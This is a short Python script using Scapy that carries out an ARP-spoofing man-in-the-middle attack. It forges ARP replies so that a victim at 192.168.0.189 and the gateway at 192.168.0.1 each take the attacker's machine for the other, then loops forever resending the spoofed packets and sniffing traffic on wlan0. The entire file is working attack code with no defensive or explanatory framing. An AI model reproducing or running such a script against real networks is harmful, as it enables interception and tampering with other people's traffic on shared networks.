#!/usr/bin/env python

import sys, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

to_gateway=ARP()
#rou.op=2
to_gateway.psrc="192.168.0.189"
to_gateway.pdst="192.168.0.1"

to_victim=ARP()
to_victim.psrc="192.168.0.1"
to_victim.pdst="192.168.0.189"

#if len(sys.argv) < 2:
#    print "Usage: ./scapy-arp-mitm.py victim_ip [iface (default eth0)]"
#    print "Make sure you have packet forwarding enabled!"
    #sys.exit(0)

#if len(sys.argv) < 3:
interface = "wlan0"


gateway = "192.168.0.1"

if not gateway:
    sys.exit(1)

print interface, gateway

while 1:
    send(to_victim, verbose=0)
    a=sniff(iface="wlan0",count=1)
    print a
    send(to_gateway, verbose=0)
    b=sniff(iface="wlan0",count=1)
    b.show()
    print "ok" 
    time.sleep(1)